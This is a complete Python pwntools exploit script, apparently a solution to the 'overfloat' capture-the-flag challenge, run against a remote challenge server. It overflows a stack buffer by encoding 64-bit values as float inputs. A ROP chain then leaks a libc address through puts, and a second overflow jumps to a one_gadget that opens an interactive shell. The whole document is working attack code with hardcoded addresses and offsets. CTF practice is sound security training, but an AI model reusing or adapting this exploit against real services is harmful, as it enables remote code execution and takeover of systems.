from pwn import *
import struct

context.binary = './overfloat'
context.arch = 'amd64'
context.log_level = 'info'

# ------------------------------------------------------------------
# Addresses from the binary (NO PIE)
# ------------------------------------------------------------------
PUTS_PLT  = 0x400690
PUTS_GOT  = 0x602020
POP_RDI   = 0x400a83
MAIN_ADDR = 0x400993

# one_gadget offset for libc-2.27.so
ONE_GADGET = 0x4f2c5

# ------------------------------------------------------------------
# Helpers for float-based memory writes
# ------------------------------------------------------------------

def u32_to_float(x):
    """Interpret 32-bit int as IEEE754 float"""
    return struct.unpack('f', struct.pack('I', x))[0]

def send_qword(io, value):
    """Send a 64-bit value as two float inputs"""
    low  = value & 0xffffffff
    high = (value >> 32) & 0xffffffff
    io.sendline(str(u32_to_float(low)))
    io.sendline(str(u32_to_float(high)))

# ------------------------------------------------------------------
# Target
# ------------------------------------------------------------------

io = remote("challenges.fbctf.com", 1341)
# io = process('./overfloat')
libc = ELF('./libc-2.27.so')

# ------------------------------------------------------------------
# STAGE 1 — libc leak via puts
# ------------------------------------------------------------------

# Fill charBuf (48) + saved RBP (8) = 56 bytes → 7 qwords
for _ in range(7):
    send_qword(io, 0xdeadbeefdeadbeef)

# ROP chain:
# puts(puts@GOT); return to main
send_qword(io, POP_RDI)
send_qword(io, PUTS_GOT)
send_qword(io, PUTS_PLT)
send_qword(io, MAIN_ADDR)

# Trigger return
io.sendline("done")

# Read output until puts prints leaked address
io.recvuntil("BON VOYAGE!\n")

# puts prints raw bytes until NULL
leak = io.recv(6)
leak = u64(leak.ljust(8, b"\x00"))

libc_base = leak - libc.symbols['puts']
log.success(f"libc base = {hex(libc_base)}")

# ------------------------------------------------------------------
# STAGE 2 — one_gadget
# ------------------------------------------------------------------

for _ in range(7):
    send_qword(io, 0xdeadbeefdeadbeef)

send_qword(io, libc_base + ONE_GADGET)

io.sendline("done")

io.interactive()

